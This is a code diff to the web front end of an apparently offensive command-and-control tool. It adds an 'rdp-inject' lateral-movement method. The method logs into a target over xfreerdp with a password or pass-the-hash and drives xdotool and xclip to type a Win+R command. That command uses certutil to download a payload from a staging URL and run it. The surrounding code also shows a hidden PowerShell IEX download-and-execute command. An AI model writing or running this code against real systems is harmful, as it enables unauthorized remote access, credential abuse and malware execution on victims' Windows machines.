@@ -1881,6 +1881,7 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
               <optgroup label="── RDP LOLBin (requires Staging URL)">
                 <option value="rdp-certutil">xfreerdp + certutil download + exec</option>
                 <option value="rdp-iex">xfreerdp + PowerShell IEX</option>
+                <option value="rdp-inject">xfreerdp + xdotool inject (Win+R)</option>
               </optgroup>
             </select>
             <button class="btn btn-ghost btn-sm" id="ipc-btn-upload" onclick="ipcRun('upload')">⬆ Upload</button>
@@ -2075,7 +2076,8 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
         <div><span style="color:var(--text3)">Transports</span> &nbsp; <span style="color:var(--text)">HTTP · HTTPS · mTLS · TCP · DNS · DoH · SMB</span></div>
       </div>
       <div style="width:48px;height:2px;background:var(--border);margin:0 auto 20px"></div>
-      <div style="font-family:var(--font-mono);font-size:16px;font-weight:700;color:var(--accent);letter-spacing:1px">x25s</div>
+      <div style="font-size:12px;color:#fff;letter-spacing:.5px;margin-bottom:4px">Made with AI, thought and directed by a human.</div>
+      <div style="font-family:var(--font-mono);font-size:14px;font-weight:700;letter-spacing:1px;text-align:center">by <span style="color:var(--accent)">x25s</span></div>
       <div style="margin-top:28px;font-size:10px;color:var(--text3);opacity:.5;letter-spacing:1px">
         USO EXCLUSIVAMENTE AUTORIZADO
       </div>
@@ -15575,9 +15577,10 @@ async function ipcRun(action) {
     const ntHash   = a.hash.replace(/^:/, '') || a.hash;
     const usePTH   = method === 'rdp-drive-pth' && ntHash;
     const rdpCreds = usePTH ? `/pth:${ntHash} /restricted-admin` : `/p:'${a.pass}'`;
-    const rdpBase  = `xfreerdp /v:${a.target} /u:'${a.user}' ${rdpCreds} /cert:ignore`;
-    // +disable-output disables all graphics decoding; 1x1 window off-screen avoids visual disruption.
-    const rdpTail  = `/w:1 /h:1 +disable-output -decorations /log-level:OFF`;
+    const rdpDom   = a.domain ? ` /d:'${a.domain}'` : '';
+    const rdpBase  = `DISPLAY=:0 xfreerdp /v:${a.target}${rdpDom} /u:'${a.user}' ${rdpCreds} /cert:ignore`;
+    // minimum 200x200 enforced by xfreerdp; +disable-output prevents graphics decoding
+    const rdpTail  = `/w:200 /h:200 +disable-output -decorations /log-level:OFF`;
 
     if (method === 'rdp-drive' || method === 'rdp-drive-pth') {
       // Mount local payload dir as \\tsclient\upload\ via FUSE drive redirection.
@@ -15607,6 +15610,38 @@ async function ipcRun(action) {
         ` "/shell:powershell -nop -w hidden -c IEX(IWR '${surl}' -UseBasicParsing)"` +
         ` ${rdpTail}`
       );
+    } else if (method === 'rdp-inject') {
+      // GUI injection: xfreerdp con ventana visible + xdotool Win+R + xclip paste + Enter.
+      // Evita el problema de /shell: ignorado por el servidor y el de FUSE en rdp-drive.
+      // xclip en lugar de xdotool type porque xdotool type pierde las barras inversas en paths Windows.
+      if (!surl) { toast('Enter Staging URL', 'error'); return; }
+      const winCmd    = `cmd /c certutil -urlcache -split -f ${surl} ${rpath} && ${rpath}`;
+      const winCmdEsc = winCmd.replace(/'/g, "'\\''");   // escapa ' para bash single-quote
+      const rdpVis    = `${rdpBase} /w:800 /h:600 /log-level:OFF`;
+      const steps = [
+        `${rdpVis} & XPID=$!`,
+        `sleep 10`,
+        `WID=$(DISPLAY=:0 xdotool search --pid $XPID 2>/dev/null | head -1)`,
+        `[ -z "$WID" ] && WID=$(DISPLAY=:0 xdotool search --class xfreerdp 2>/dev/null | tail -1)`,
+        `echo "[*] RDP window=$WID pid=$XPID"`,
+        `printf '%s' '${winCmdEsc}' | DISPLAY=:0 xclip -selection clipboard`,
+        `sleep 1`,
+        `DISPLAY=:0 xdotool windowfocus --sync "$WID"`,
+        `sleep 0.3`,
+        `DISPLAY=:0 xdotool key --window "$WID" Escape`,
+        `sleep 0.5`,
+        `DISPLAY=:0 xdotool key --window "$WID" super+r`,
+        `sleep 2`,
+        `DISPLAY=:0 xdotool key --window "$WID" ctrl+a`,
+        `sleep 0.3`,
+        `DISPLAY=:0 xdotool key --window "$WID" ctrl+v`,
+        `sleep 0.5`,
+        `DISPLAY=:0 xdotool key --window "$WID" Return`,
+        `sleep 10`,
+        `kill $XPID 2>/dev/null`,
+        `echo "[+] rdp-inject done"`,
+      ];
+      cmds.push(`( ${steps.join('; ')} )`);
     }
   }
 
